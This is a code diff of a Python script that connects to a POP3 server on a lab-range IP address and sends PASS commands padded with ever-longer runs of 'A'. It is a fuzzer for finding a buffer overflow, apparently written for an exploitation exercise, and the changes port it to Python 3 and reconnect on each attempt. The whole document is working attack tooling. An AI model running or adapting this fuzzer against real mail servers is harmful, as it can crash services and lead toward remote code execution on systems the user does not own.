@@ -8,9 +8,9 @@
 
 import socket, sys, os
 
-def main():
+def main(argv):
     # Client machine IPv4 address
-    clientIP = 192.168.56.105
+    clientIP = "192.168.56.105"
     clinetPORT = 110
 
     # Maximum size of PASS buffer sized passed to POP3 server
@@ -19,20 +19,20 @@ def main():
     # Declare a acceptable buffer size that fits into TCP Packet
     BUFFER_SIZE = 1024
 
-    # Create a new socket to the server
-    serverSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
     # Define Static username to pass into POP3 protocol USER prompt
     #
     USER = "user"
 
     # Check to see if the a name exists on the remote machine
-    for i in xrange(0,MAX_PASS_BUFFER_LEN)
+    for i in range(1 ,MAX_PASS_BUFFER_LEN):
         # Try to connect to passed IP
         try:
+            # Create a new socket to the server
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((clientIP, clinetPORT))
-        except Exception:
+        except Exception as e:
             print("\n\nConnection could not be made to server.")
+            print("Exception: " + str(e))
             s.close()
             return -1
 
@@ -48,9 +48,18 @@ def main():
         print("Received data: \n" + data)
 
         # Send server password (with long string of A times i)
-        s.send(bytes("PASS " + "A"*i + "\r\n"))
+        s.send(bytes("PASS " + "A"*i + "\r\n", 'UTF-8'))
 
         # Wait to receive a message
         data = s.recv(BUFFER_SIZE)
         data =  bytes.decode(data, 'UTF-8')
         print("Received data: \n" + data)
+        
+        # Reset connection for next iteration
+        s.close()
+    return 0
+
+
+# Run main if tihs is ran as main function. 
+if __name__ == "__main__":
+    main(sys.argv)
